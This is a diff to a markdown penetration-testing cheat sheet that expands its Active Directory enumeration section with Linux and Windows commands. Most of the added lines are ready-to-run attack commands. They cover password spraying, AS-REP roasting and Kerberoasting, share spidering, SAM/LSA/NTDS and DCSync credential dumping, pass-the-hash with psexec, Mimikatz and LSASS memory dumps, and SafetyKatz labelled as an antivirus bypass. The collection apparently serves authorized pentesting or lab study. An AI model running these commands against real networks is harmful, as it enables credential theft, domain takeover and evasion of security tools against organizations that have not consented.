@@ -130,7 +130,14 @@ Build a complete, repeatable picture of each target: live hosts, open ports, ser
 
 - [ ] **Enumerate domain + trusts** → [17.1](#171-domain-enumeration)
 - [ ] **Enumerate users/groups/privs** → [17.2](#172-user-and-group-enumeration)
-- [ ] **Assess Kerberos exposure** → [17.3](#173-kerberos-enumeration)
+- [ ] **Enumerate computers/hosts** → [17.3](#173-computer-and-host-enumeration)
+- [ ] **Assess Kerberos exposure** → [17.4](#174-kerberos-enumeration)
+- [ ] **Enumerate shares/files** → [17.5](#175-share-and-file-enumeration)
+- [ ] **Analyze ACLs/permissions** → [17.6](#176-acl-and-permission-enumeration)
+- [ ] **Deep LDAP enumeration** → [17.7](#177-ldap-detailed-enumeration)
+- [ ] **Enumerate GPOs** → [17.8](#178-gpo-enumeration)
+- [ ] **Find active sessions** → [17.9](#179-session-and-logon-enumeration)
+- [ ] **Extract credentials/hashes** → [17.10](#1710-credential-and-hash-enumeration)
 
 ### Documentation
 
@@ -1758,73 +1765,500 @@ hydra -s 5900 -P /usr/share/wordlists/rockyou.txt vnc://<RHOST>
 
 ## 17. Active Directory Enumeration
 
-### 17.1 Domain enumeration
+### 17.1 Domain Enumeration
 
+#### Linux Tools
 ```bash
 # Get domain info with nxc
 nxc smb <RHOST>
+nxc smb <RHOST> --pass-pol  # Get password policy
 
 # Get shares with null session
 nxc smb <RHOST> -u '' -p '' --shares
+nxc smb <RHOST> -u 'guest' -p '' --shares
 
 # LDAP naming contexts
 ldapsearch -x -H ldap://<DC_IP> -s base namingcontexts
 
+# LDAP domain enumeration
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local'
+
 # BloodHound data collection
 bloodhound-python -c All -u '<USER>' -p '<PASS>' -d <DOMAIN> -dc <DC_HOSTNAME> -ns <DC_IP>
+bloodhound-python -c DCOnly -u '<USER>' -p '<PASS>' -d <DOMAIN> -dc <DC_HOSTNAME> -ns <DC_IP>
 
 # Get domain SID
 rpcclient -U '<USER>%<PASS>' <RHOST> -c "lsaquery"
+impacket-lookupsid '<DOMAIN>/<USER>:<PASS>'@<DC_IP>
+
+# Enumerate domain controllers
+nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>
+dig -t SRV _ldap._tcp.dc._msdcs.<DOMAIN>
+
+# Enumerate trusts with Impacket
+impacket-Get-ADTrust -u '<USER>' -p '<PASS>' -d <DOMAIN> -dc-ip <DC_IP>
+
+# Get domain password policy
+nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --pass-pol
+enum4linux -P <DC_IP>
 ```
 
-### 17.2 User and group enumeration
+#### Windows Tools
+```powershell
+# PowerShell domain info
+Get-ADDomain
+Get-ADForest
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 
+# Get domain controllers
+Get-ADDomainController -Filter *
+nltest /dclist:<DOMAIN>
+
+# Get domain SID
+Get-ADDomain | Select-Object DomainSID
+
+# Get domain trusts
+Get-ADTrust -Filter *
+nltest /domain_trusts
+
+# Get password policy
+Get-ADDefaultDomainPasswordPolicy
+net accounts /domain
+
+# PowerView domain enumeration
+Import-Module .\PowerView.ps1
+Get-NetDomain
+Get-NetDomainController
+Get-NetForest
+Get-NetForestDomain
+Get-NetForestTrust
+
+# Active Directory Module
+Import-Module ActiveDirectory
+Get-ADObject -Filter * -Properties *
+```
+
+### 17.2 User and Group Enumeration
+
+#### Linux Tools
 ```bash
 # Enumerate domain users with nxc
 nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --users
+nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' --users
 
 # Enumerate domain groups with nxc
 nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --groups
+nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' --groups
 
 # RID brute force with nxc
 nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --rid-brute
+nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --rid-brute 10000
 
 # Enumerate users with rpcclient
 rpcclient -U '<USER>%<PASS>' <DC_IP> -c "enumdomusers"
+rpcclient -U '<USER>%<PASS>' <DC_IP> -c "querydispinfo"
+rpcclient -U '<USER>%<PASS>' <DC_IP> -c "queryuser <RID>"
 
 # Enumerate groups with rpcclient
 rpcclient -U '<USER>%<PASS>' <DC_IP> -c "enumdomgroups"
+rpcclient -U '<USER>%<PASS>' <DC_IP> -c "querygroup <RID>"
+rpcclient -U '<USER>%<PASS>' <DC_IP> -c "querygroupmem <RID>"
 
 # LDAP user enumeration
-ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(objectClass=user)' sAMAccountName
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(objectClass=user)' sAMAccountName userPrincipalName
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(objectClass=user)' sAMAccountName description
+
+# LDAP group enumeration
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(objectClass=group)' cn member
 
 # Impacket AD user enumeration
 impacket-GetADUsers -all -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASS>'
+impacket-GetADUsers -all -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASS>' | grep -i admin
+
+# Enumerate privileged users
+nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' --admin-count
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(adminCount=1)' sAMAccountName
+
+# Enumerate user attributes
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(objectClass=user)' | grep -i "userAccountControl\|pwdLastSet\|lastLogon"
+
+# Enum4linux
+enum4linux -a <DC_IP>
+enum4linux -U <DC_IP>  # Users
+enum4linux -G <DC_IP>  # Groups
+enum4linux -u '<USER>' -p '<PASS>' -a <DC_IP>
 ```
 
-### 17.3 Kerberos enumeration
+#### Windows Tools
+```powershell
+# Get all domain users
+Get-ADUser -Filter * -Properties *
+Get-ADUser -Filter * | Select-Object Name,SamAccountName,Enabled
+net user /domain
+net user <USERNAME> /domain
 
+# Get specific user properties
+Get-ADUser -Identity <USERNAME> -Properties *
+Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description -ne $null}
+
+# Find admin users
+Get-ADUser -Filter {adminCount -eq 1} -Properties *
+Get-ADGroupMember -Identity "Domain Admins" -Recursive
+Get-ADGroupMember -Identity "Enterprise Admins" -Recursive
+
+# Get all groups
+Get-ADGroup -Filter * -Properties *
+net group /domain
+net group "Domain Admins" /domain
+
+# Get group members
+Get-ADGroupMember -Identity "Domain Admins"
+Get-ADGroupMember -Identity "Enterprise Admins"
+Get-ADPrincipalGroupMembership -Identity <USERNAME>
+
+# PowerView user enumeration
+Get-NetUser
+Get-NetUser -Username <USER>
+Get-NetUser | Select-Object samaccountname,description,pwdlastset,lastlogon
+Get-NetUser -SPN  # Find users with SPNs (Kerberoastable)
+Get-NetUser -AdminCount  # Find privileged users
+
+# PowerView group enumeration
+Get-NetGroup
+Get-NetGroup -GroupName "Domain Admins"
+Get-NetGroupMember -GroupName "Domain Admins"
+Get-NetLocalGroup -ComputerName <HOSTNAME>  # Local groups on remote machine
+
+# Find shares and access
+Find-DomainShare -CheckShareAccess
+
+# LDAP queries via PowerShell
+$searcher = [adsisearcher]"(objectClass=user)"
+$searcher.FindAll()
+```
+
+### 17.3 Computer and Host Enumeration
+
+#### Linux Tools
+```bash
+# Enumerate computers with nxc
+nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --computers
+nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' --computers
+
+# LDAP computer enumeration
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(objectClass=computer)' dNSHostName operatingSystem
+
+# Find Domain Controllers
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(userAccountControl:1.2.840.113556.1.4.803:=8192)' dNSHostName
+
+# Ping sweep for live hosts
+nmap -sn <NETWORK>/24
+nxc smb <NETWORK>/24
+```
+
+#### Windows Tools
+```powershell
+# Get all computers
+Get-ADComputer -Filter * -Properties *
+Get-ADComputer -Filter * | Select-Object Name,DNSHostName,OperatingSystem
+
+# Find domain controllers
+Get-ADDomainController -Filter *
+
+# Find computers by OS
+Get-ADComputer -Filter {OperatingSystem -like "*Windows 10*"}
+Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
+
+# PowerView computer enumeration
+Get-NetComputer
+Get-NetComputer -OperatingSystem "*Server*"
+Get-NetComputer -Ping  # Only live hosts
+Get-NetComputer -FullData | Select-Object dnshostname,operatingsystem,lastlogon
+```
+
+### 17.4 Kerberos Enumeration
+
+#### Linux Tools
 ```bash
 # Kerbrute user enumeration
 kerbrute userenum -d <DOMAIN> --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt -o valid_users.txt
 
 # Kerbrute password spray
 kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<PASSWORD>'
+kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> valid_users.txt '<PASSWORD>' --safe
 
 # AS-REP roasting without credentials
 impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat
+impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile users.txt -dc-ip <DC_IP>
 
 # AS-REP roasting with credentials
 impacket-GetNPUsers '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request
+impacket-GetNPUsers '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request -outputfile asrep_hashes.txt
 
 # Kerberoasting
 impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request
+impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request -outputfile kerberoast_hashes.txt
 
 # Nmap Kerberos user enumeration
 nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='<DOMAIN>',userdb=users.txt <DC_IP>
+
+# Request TGT
+impacket-getTGT '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>
+export KRB5CCNAME=<USER>.ccache
+
+# Kerberos brute force
+nxc smb <DC_IP> -u users.txt -p '<PASSWORD>' --kerberos
+nxc smb <DC_IP> -u '<USER>' -p passwords.txt --kerberos
 ```
 
----
+#### Windows Tools
+```powershell
+# Request TGT
+klist
+klist purge  # Clear tickets
+
+# Rubeus AS-REP roasting
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
+.\Rubeus.exe asreproast /user:<USERNAME> /format:hashcat
+
+# Rubeus Kerberoasting
+.\Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast_hashes.txt
+.\Rubeus.exe kerberoast /user:<USERNAME> /format:hashcat
+
+# PowerView Kerberoasting
+Invoke-Kerberoast -OutputFormat Hashcat
+Get-NetUser -SPN | Invoke-Kerberoast
+
+# Find Kerberoastable users
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+setspn -Q */*  # Query all SPNs in domain
+
+# Find AS-REP roastable users
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
+```
+
+### 17.5 Share and File Enumeration
+
+#### Linux Tools
+```bash
+# Enumerate shares with nxc
+nxc smb <RHOST> -u '<USER>' -p '<PASS>' --shares
+nxc smb <NETWORK>/24 -u '<USER>' -p '<PASS>' --shares
+
+# Spider shares for sensitive files
+nxc smb <RHOST> -u '<USER>' -p '<PASS>' -M spider_plus
+nxc smb <RHOST> -u '<USER>' -p '<PASS>' -M spider_plus -o READ_ONLY=false
+
+# Search for specific files
+nxc smb <RHOST> -u '<USER>' -p '<PASS>' --spider C$ --pattern txt
+nxc smb <RHOST> -u '<USER>' -p '<PASS>' -M spider_plus -o EXCLUDE_DIR=Windows,InetPub
+
+# Enumerate shares with smbclient
+smbclient -L //<RHOST> -U '<USER>%<PASS>'
+smbclient //<RHOST>/<SHARE> -U '<USER>%<PASS>'
+
+# Enumerate shares with smbmap
+smbmap -H <RHOST> -u '<USER>' -p '<PASS>'
+smbmap -H <RHOST> -u '<USER>' -p '<PASS>' -R <SHARE>  # Recursive
+smbmap -H <RHOST> -u '<USER>' -p '<PASS>' -r <SHARE>  # List directory
+
+# Mount SMB share
+mount -t cifs //<RHOST>/<SHARE> /mnt/share -o username=<USER>,password=<PASS>
+```
+
+#### Windows Tools
+```powershell
+# List shares
+net view \\<HOSTNAME>
+Get-SmbShare  # Local shares
+
+# Access share
+net use Z: \\<HOSTNAME>\<SHARE>
+New-PSDrive -Name "Z" -PSProvider FileSystem -Root "\\<HOSTNAME>\<SHARE>"
+
+# PowerView share enumeration
+Invoke-ShareFinder
+Invoke-ShareFinder -CheckShareAccess
+Invoke-FileFinder  # Find sensitive files
+Find-InterestingDomainShareFile
+
+# Find files on shares
+Get-ChildItem -Path "\\<HOSTNAME>\<SHARE>" -Recurse
+Get-ChildItem -Path "\\<HOSTNAME>\<SHARE>" -Recurse -Include *.txt,*.xml,*.config,*.ini
+```
+
+### 17.6 ACL and Permission Enumeration
+
+#### Linux Tools
+```bash
+# BloodHound ACL analysis (use BloodHound GUI for visualization)
+bloodhound-python -c All -u '<USER>' -p '<PASS>' -d <DOMAIN> -dc <DC_HOSTNAME> -ns <DC_IP>
+
+# LDAP query for ACLs (complex, better use BloodHound)
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(objectClass=*)' nTSecurityDescriptor
+```
+
+#### Windows Tools
+```powershell
+# Get ACL for object
+Get-Acl -Path "AD:\CN=<USER>,CN=Users,DC=<DOMAIN>,DC=local" | Format-List
+
+# PowerView ACL enumeration
+Get-ObjectAcl -SamAccountName <USER> -ResolveGUIDs
+Get-ObjectAcl -SamAccountName <USER> -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}
+
+# Find interesting ACLs
+Invoke-ACLScanner -ResolveGUIDs
+Find-InterestingDomainAcl -ResolveGUIDs
+
+# Get users with DCSync rights
+Get-ObjectAcl -DistinguishedName "DC=<DOMAIN>,DC=local" -ResolveGUIDs | Where-Object {($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
+
+# SharpHound for BloodHound (Windows)
+.\SharpHound.exe -c All
+.\SharpHound.exe -c DCOnly
+```
+
+### 17.7 LDAP Detailed Enumeration
+
+#### Linux Tools
+```bash
+# Anonymous LDAP bind
+ldapsearch -x -H ldap://<DC_IP> -b 'DC=<DOMAIN>,DC=local'
+
+# Authenticated LDAP bind
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local'
+
+# Enumerate specific attributes
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(objectClass=user)' sAMAccountName mail description userAccountControl
+
+# Find users with SPNs
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName
+
+# Find users without Kerberos pre-auth
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName
+
+# Find privileged users (adminCount=1)
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(&(objectClass=user)(adminCount=1))' sAMAccountName
+
+# Enumerate GPOs
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(objectClass=groupPolicyContainer)' displayName gPCFileSysPath
+
+# Use ldapdomaindump
+ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASS>' <DC_IP>
+```
+
+#### Windows Tools
+```powershell
+# ADSI LDAP queries
+$searcher = New-Object DirectoryServices.DirectorySearcher
+$searcher.Filter = "(objectClass=user)"
+$searcher.FindAll()
+
+# Find all users
+([adsisearcher]"(objectClass=user)").FindAll()
+
+# Find admin users
+([adsisearcher]"(&(objectClass=user)(adminCount=1))").FindAll()
+
+# Find users with SPNs
+([adsisearcher]"(&(objectClass=user)(servicePrincipalName=*))").FindAll()
+```
+
+### 17.8 GPO Enumeration
+
+#### Linux Tools
+```bash
+# LDAP GPO enumeration
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(objectClass=groupPolicyContainer)' displayName gPCFileSysPath
+
+# Access SYSVOL share for GPO files
+smbclient //<DC_IP>/SYSVOL -U '<USER>%<PASS>'
+nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --shares | grep SYSVOL
+```
+
+#### Windows Tools
+```powershell
+# Get all GPOs
+Get-GPO -All
+Get-GPO -Name "<GPO_NAME>"
+
+# Get GPO links
+Get-GPInheritance -Target "OU=<OU>,DC=<DOMAIN>,DC=local"
+
+# PowerView GPO enumeration
+Get-NetGPO
+Get-NetGPO | Select-Object displayname,whenchanged
+Get-NetGPOGroup  # Find GPOs that modify local group membership
+
+# Find computers where user has local admin via GPO
+Find-GPOComputerAdmin -UserName <USER>
+Find-GPOLocation -UserName <USER>
+```
+
+### 17.9 Session and Logon Enumeration
+
+#### Linux Tools
+```bash
+# Enumerate logged-on users
+nxc smb <RHOST> -u '<USER>' -p '<PASS>' --sessions
+nxc smb <RHOST> -u '<USER>' -p '<PASS>' --loggedon-users
+
+# Enumerate sessions on multiple hosts
+nxc smb <NETWORK>/24 -u '<USER>' -p '<PASS>' --sessions
+```
+
+#### Windows Tools
+```powershell
+# Get logged-on users
+query user /server:<HOSTNAME>
+qwinsta /server:<HOSTNAME>
+
+# PowerView session enumeration
+Get-NetSession -ComputerName <HOSTNAME>
+Get-NetLoggedon -ComputerName <HOSTNAME>
+Invoke-UserHunter  # Find where domain admins are logged in
+Invoke-UserHunter -GroupName "Domain Admins"
+```
+
+### 17.10 Credential and Hash Enumeration
+
+#### Linux Tools
+```bash
+# Dump credentials with nxc
+nxc smb <RHOST> -u '<USER>' -p '<PASS>' --sam
+nxc smb <RHOST> -u '<USER>' -p '<PASS>' --lsa
+nxc smb <RHOST> -u '<USER>' -p '<PASS>' --ntds
+
+# Secretsdump with Impacket
+impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<DC_IP>
+impacket-secretsdump -just-dc '<DOMAIN>/<USER>:<PASS>'@<DC_IP>
+impacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USER>:<PASS>'@<DC_IP>
+impacket-secretsdump -just-dc-user <USERNAME> '<DOMAIN>/<USER>:<PASS>'@<DC_IP>
+
+# Pass-the-hash
+nxc smb <RHOST> -u '<USER>' -H '<NTLM_HASH>'
+impacket-psexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<RHOST>
+```
+
+#### Windows Tools
+```powershell
+# Mimikatz
+.\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::sam
+lsadump::secrets
+lsadump::dcsync /domain:<DOMAIN> /user:<USER>
+
+# SafetyKatz (bypass AV)
+.\SafetyKatz.exe
+
+# Dump credentials from memory
+procdump.exe -ma lsass.exe lsass.dmp
+.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
+```
 
 ## 18. Documentation and Hypotheses
 
